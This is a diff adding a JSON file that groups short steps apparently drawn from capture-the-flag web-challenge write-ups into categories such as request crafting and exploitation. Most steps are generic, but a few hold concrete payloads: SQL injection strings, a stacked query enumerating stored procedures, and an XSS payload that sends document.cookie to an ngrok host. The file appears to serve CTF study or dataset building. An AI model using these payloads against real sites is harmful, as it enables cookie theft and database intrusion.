@@ -1,0 +1,47 @@
+{
+    "Crafting Web Requests": [
+        "Refer to a writeup for information on crafting the AJP request.",
+        "Send a POST request to /feed.php.",
+        "Constructed the POST request with 'user' and 'pass' parameters",
+        "Craft a URL using the identified character.",
+        "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1'."
+    ],
+    "File System Manipulation": [
+        "Read binary '/readflag'.",
+        "The objective is to overwrite '.bashrc' file with their payload",
+        "Developed a payload to read the flag file",
+        "Find the flag file in the current working directory."
+    ],
+    "Web Application Analysis": [
+        "Analyse the challenge",
+        "Identify PHP object injection vulnerability through unserialize() function.",
+        "Speculated a connection with security protections such as WAF after noting certain factors.",
+        "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
+        "Adjusted line 1 and 3 of the payload to work with 'nunjucks'."
+    ],
+    "Web Navigation": [
+        "Observe URL Capture button on the website",
+        "Open a web browser.",
+        "Visit the website."
+    ],
+    "Server Configuration": [
+        "Programmed the server to redirect to 'http://localhost/flag' in the second response.",
+        "Recognize that access is prevented unless not going through the proxy.",
+        "Configure the personal DNS server to respond with a public IP during the IP check."
+    ],
+    "Web Security Exploitation": [
+        "Identify JWT 'identity' cookie as '31337'",
+        "Create the final payload: '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img'",
+        "Extract the final flag."
+    ],
+    "Web Application Source Code Review": [
+        "View PHP source code"
+    ],
+    "Debugging and Troubleshooting": [
+        "Analyze the 'history.length' attribute to determine if a redirect occurred.",
+        "Observe the 'Permission Denied!' message",
+        "Noted the creation of a 'storage.db' file",
+        "Understood that the `writeOutput` function could potentially be invoked while the program was still running.",
+        "Paste the copied output into the function body."
+    ]
+}
